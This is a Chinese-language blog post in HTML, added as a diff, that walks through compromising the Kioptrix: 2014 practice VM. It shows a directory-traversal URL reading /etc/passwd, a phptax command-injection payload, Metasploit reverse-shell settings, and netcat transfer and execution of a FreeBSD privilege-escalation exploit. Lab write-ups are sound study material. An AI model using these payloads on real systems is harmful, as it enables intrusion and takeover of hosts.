@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>Kioptrix: 2014 | 老白</title>
+        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">Kioptrix: 2014</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-09-16 21:02:03">2021-09-16 / 2 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="主机探测">主机探测</h1>
+<p> <code>netdiscover -i eth0 -r 192.168.223.1</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645276482095.png" alt="" loading="lazy"></p>
+<h1 id="端口-服务探测">端口、服务探测</h1>
+<p> <code>masscan -p 0-65535 --rate=10000 192.168.223.147</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645276576620.png" alt="" loading="lazy"><br>
+ <code>nmap -O -T4 -sV -A -p 80,8080 192.168.223.147</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645276955645.png" alt="" loading="lazy"></p>
+<h1 id="web">web</h1>
+<p><img src="https://V-alkoinen.github.io/post-images/1645277077020.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645277387553.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645278208611.png" alt="" loading="lazy"><br>
+ 8080端口没权限访问，Apache默认的403页面，所以肯定是httpd.conf有问题<br>
+ 扫一下目录<br>
+ <code>dirb http://192.168.223.147 /usr/share/dirb/wordlists/big.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645277423180.png" alt="" loading="lazy"><br>
+ <code>http://192.168.223.147/pChart2.1.3/examples/index.php</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645277476438.png" alt="" loading="lazy"><br>
+ 找下漏洞，有个目录穿越，并没有RCE<br>
+ <code>searchsploit pChart</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645277983161.png" alt="" loading="lazy"><br>
+ <code>cat /usr/share/exploitdb/exploits/php/webapps/31173.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645278067610.png" alt="" loading="lazy"><br>
+ <code>http://192.168.223.147/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645278127917.png" alt="" loading="lazy"><br>
+ 之前8080被httpd.conf403了，网上找了下这个文件<br>
+ <code>/etc/apache22/httpd.conf</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645279121223.png" alt="" loading="lazy"><br>
+ 没找到，可能是root自行下载包进行安装的<br>
+ <code>/usr/local/etc/apache22/httpd.conf</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645279464466.png" alt="" loading="lazy"><br>
+ 找了下8080，发现只有ua设置为<code>Mozilla/4.0 Mozilla4_browser</code>时方能访问<br>
+<img src="https://V-alkoinen.github.io/post-images/1645279593082.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645279637585.png" alt="" loading="lazy"><br>
+ <code>http://192.168.223.147:8080/phptax/</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645279831704.png" alt="" loading="lazy"><br>
+ <code>searchsploit phptax</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645279886687.png" alt="" loading="lazy"><br>
+ <code>cat /usr/share/exploitdb/exploits/php/webapps/21665.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645280288275.png" alt="" loading="lazy"><br>
+ 先试一下payload<br>
+<code>phptax/drawimage.php?pfilez=xxx;%20ifconfig%20%3E%201.txt;&amp;pdf=make</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645280785618.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645280791567.png" alt="" loading="lazy"><br>
+ 使用<code>metasploit</code></p>
+<pre><code>msfconsole
+search phptax
+use 0
+show options
+set rhosts 192.168.223.147
+set rports 8080
+show payloads
+set payload 5
+set lhost 192.168.223.134
+exploit
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1645282801478.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645282848290.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645282894398.png" alt="" loading="lazy"><br>
+ 查看系统版本<br>
+ <code>uname -a</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645283409711.png" alt="" loading="lazy"><br>
+ <code>searchsploit FreeBSD Privilege</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645284008116.png" alt="" loading="lazy"><br>
+ 看了下目标靶机 wget、curl等命令都没有，所以用nc传文件<br>
+<code>nc -nvlp 5555 &lt; /usr/share/exploitdb/exploits/freebsd/local/28718.c</code><br>
+<code>nc -nv 192.168.223.134 5555 &gt; 1.c</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645284110971.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645284328654.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645284334901.png" alt="" loading="lazy"></p>
+<pre><code>gcc 1.c -o exp
+./exp
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1645284463648.png" alt="" loading="lazy"></figure>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/Dependency Confusion/">Dependency Confusion</a></div></div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/kioptrix-level-1-3/">Kioptrix: Level 1.3</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
